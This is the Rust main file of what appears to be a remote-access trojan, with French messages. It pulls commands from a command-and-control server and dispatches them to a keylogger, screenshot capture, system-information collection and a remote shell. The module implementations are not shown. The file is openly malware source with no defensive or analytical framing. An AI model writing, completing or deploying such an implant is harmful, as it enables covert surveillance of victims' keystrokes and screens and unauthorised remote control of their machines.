mod connexion;
mod input;
mod logs;
mod screenshot;
mod shell;
use tokio::task::JoinHandle;

#[tokio::main]

async fn main() {
    match connexion::get_directives().await {
        Ok(commands) => {
            println!("Commands received: {:?}", commands);
            let mut handles: Vec<JoinHandle<()>> = Vec::new();

            for command in commands {
                match command.as_str() {
                    "keylogger" => {
                        let handle = tokio::spawn(async {
                            println!("Démarrage du keylogger...");
                            let keylogger = input::start_keylogger(10).await;
                            if let Err(e) = keylogger {
                                eprintln!("La tâche keylogger a échoué : {:?}", e);
                            }
                            println!("Keylogger terminé");
                        });
                        handles.push(handle);
                    }
                    "screenshot" => {
                        let handle = tokio::spawn(async {
                            println!("Prise de screenshot...");
                            screenshot::take_screenshot().await;
                            println!("Screenshot terminé");
                        });
                        handles.push(handle);
                    }
                    "logs" => {
                        let handle = tokio::spawn(async {
                            println!("Récupération des logs système...");
                            let log = logs::get_sysinfo().await;
                            if let Err(e) = log {
                                eprintln!("Erreur logs : {:?}", e)
                            }
                            println!("Logs terminés");
                        });
                        handles.push(handle);
                    }
                    "shell" => {
                        std::thread::spawn(|| {
                            shell::launch_shell();
                        });
                    }
                    _ => println!("Commande inconnue: {}", command),
                }
            }
            for (i, handle) in handles.into_iter().enumerate() {
                match handle.await {
                    Ok(_) => println!("Tâche {} terminée avec succès", i),
                    Err(e) => eprintln!("Tâche {} a paniqué : {:?}", i, e),
                }
            }
        }
        Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
    }
}
